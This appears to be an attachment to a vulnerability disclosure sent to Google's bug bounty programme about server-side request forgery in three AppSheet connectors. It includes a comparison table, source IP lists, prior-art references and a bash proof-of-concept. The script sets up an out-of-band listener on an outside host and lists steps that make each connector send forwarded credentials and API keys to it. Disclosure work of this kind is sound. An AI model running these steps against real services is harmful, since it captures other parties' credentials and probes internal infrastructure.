# Attachment 4 — Three-Surface Comparison + Full PoC Script
# AppSheet Systemic SSRF (F003) — Google VRP Submission
# Reporter: azmolhaque95@gmail.com | Date: 2026-06-19

---

## THREE-SURFACE COMPARISON

| Property                  | Surface 1 (OData)                                        | Surface 2 (Apigee OpenAPI)                          | Surface 3 (Cloud Database)                              |
|---------------------------|----------------------------------------------------------|-----------------------------------------------------|----------------------------------------------------------|
| Endpoint                  | /Account/ODataAuthInfo                                   | /Account/ApigeeAuthInfo                             | /Account/SQLConnectionInfo                               |
| Trigger action            | "Test"                                                   | "Validate"                                          | "Test"                                                   |
| Protocol layer            | HTTP                                                     | HTTP                                                | TCP (database protocol)                                  |
| GCP source IP             | 35.203.182.241, 35.185.223.113, 35.247.115.29, 34.82.138.241 | 35.233.152.59 / 8.231.222.130                  | DNS: 172.217.46.x, 192.178.118.x (AS15169 resolvers)    |
| Network client            | Microsoft.OData.Client (v3/v4); Microsoft.Data.Services.Client (v2) | Apigee HTTP client via internal Squid proxy | DB TCP driver (MySQL + 7 other DB types)               |
| Credential forwarded      | Authorization: Basic (username:password, Base64)         | X-Apikey (Apigee API key, plaintext)                | DB password (plaintext if SSL Mode: None)                |
| Traceparent leaked        | YES — internal W3C trace ID                              | YES — independent trace ID                          | N/A (DNS phase, pre-connect)                             |
| Internal topology leak    | None                                                     | Via: squid-proxy-open-api-us-west1-sqws (region, service name, proxy type) | None (TCP connect failed) |
| Response oracle           | Content-type in MIME error                               | Full HTML body in spec parse error                  | Binary: "Failed to connect" / timeout                    |
| HTTPS→HTTP redirect       | BLOCKED (tested 2026-06-19)                              | BLOCKED (tested 2026-06-19)                         | N/A                                                      |
| DB types affected         | —                                                        | —                                                   | 8: SQLServer, MySQL, Postgres, DynamoDB, MariaDB, Redshift, Oracle, BigQuery |
| Prior VRP fix             | None — novel surface                                     | Partial (prior fix covered different code path in same connector) | None — novel surface |
| Confirmed dates           | 5 dates: 2026-06-15, -16, -16, -17, -19                 | 2026-06-16, -18, -19                                | 2026-06-19                                               |
| Account required          | Free                                                     | Free                                                | Free                                                     |

---

## GCP FLEET IPs CONFIRMED (all AS15169 Google Cloud)

| IP Address      | Surface | Date first seen    |
|-----------------|---------|-------------------|
| 35.203.182.241  | 1       | 2026-06-15        |
| 35.247.115.29   | 1       | 2026-06-16        |
| 35.185.223.113  | 1       | 2026-06-19        |
| 34.82.138.241   | 1       | 2026-06-17        |
| 35.233.152.59   | 2       | 2026-06-16        |
| 8.231.222.130   | 2       | 2026-06-18, -19   |

All verified: whois <IP> | grep -i orgname → Google LLC / Google Cloud

---

## FULL POC SCRIPT

```bash
#!/bin/bash
# AppSheet Systemic SSRF — Proof of Concept Setup
# Requirements: interactsh-client, free AppSheet account (appsheet.com)
# Confirmed reproduced: 2026-06-16 through 2026-06-19

# 1. Start OOB listener
interactsh-client -server oast.pro -v 2>&1 | tee ~/oob_appsheet.log &
sleep 4
OOB=$(grep -oE '[a-z0-9]+\.oast\.pro' ~/oob_appsheet.log | head -1)
echo "[*] OOB hostname: $OOB"

echo ""
echo "=== SURFACE 1: OData Connector ==="
echo "  URL:     https://appsheet.com/Account/ODataAuthInfo"
echo "  Version: 4.0  (also test 3.0 and 2.0)"
echo "  Service Root URL: https://$OOB"
echo "  Username: canary-odata"
echo "  Password: canary-odata"
echo "  Click: Test"
echo "  Expect: GCP-origin GET /$metadata, Authorization: Basic forwarded"

echo ""
echo "=== SURFACE 2: Apigee API Connector (OpenAPI Spec tab) ==="
echo "  URL:     https://appsheet.com/Account/ApigeeAuthInfo"
echo "  Tab:     OpenAPI Spec"
echo "  Auth:    ApiKey"
echo "  API Key: vrp-canary-$(date +%s)"
echo "  OpenAPI Spec URL: https://$OOB"
echo "  Click: Validate"
echo "  Expect: GCP-origin GET /, X-Apikey forwarded, Via: squid-proxy-*"

echo ""
echo "=== SURFACE 3: Cloud Database Connector (MySQL) ==="
echo "  URL:     https://appsheet.com/Account/SQLConnectionInfo"
echo "  Type:    MySQL"
echo "  Server:  $OOB   ← hostname only, no port, no https://"
echo "  DB:      test"
echo "  User:    canary-db"
echo "  Pass:    canary-db"
echo "  SSL:     Don't require SSL"
echo "  Click: Test"
echo "  Expect: 15 DNS A+AAAA queries from 172.217.x / 192.178.x (Google AS15169)"

echo ""
echo "[*] Monitor: tail -f ~/oob_appsheet.log"
```

---

## ATTRIBUTION SCRIPT

```bash
#!/bin/bash
# Confirm GCP ownership of any source IP received
ip=$1
whois "$ip" 2>/dev/null | grep -iE 'OrgName|netname|org-name' | head -3
# Expected output: Google LLC / Google Cloud Platform / AS15169
```

---

## PRIOR ART — SAME ROOT CAUSE, DIFFERENT CODE PATHS

| Year | Report | Component | Status |
|------|--------|-----------|--------|
| 2021 | nechudav.blogspot.com/2021/12/ssrf-vulnerability-in-appsheet | Workflows/Bots webhook executor | Fixed |
| ~2022–24 | bughunters.google.com/reports/vrp/PnwRwydmr | Apigee connector (API base URL path) | Fixed |
| 2026 | This report (F003) | OData connector (v2, v3, v4) | Open |
| 2026 | This report (F003) | Apigee connector (OpenAPI Spec URL path) | Open |
| 2026 | This report (F003) | Cloud Database connector (8 DB types) | Open |

Pattern: each prior fix addressed one code path; no centralized egress control was introduced.
Every unreviewed connector type is open by default.
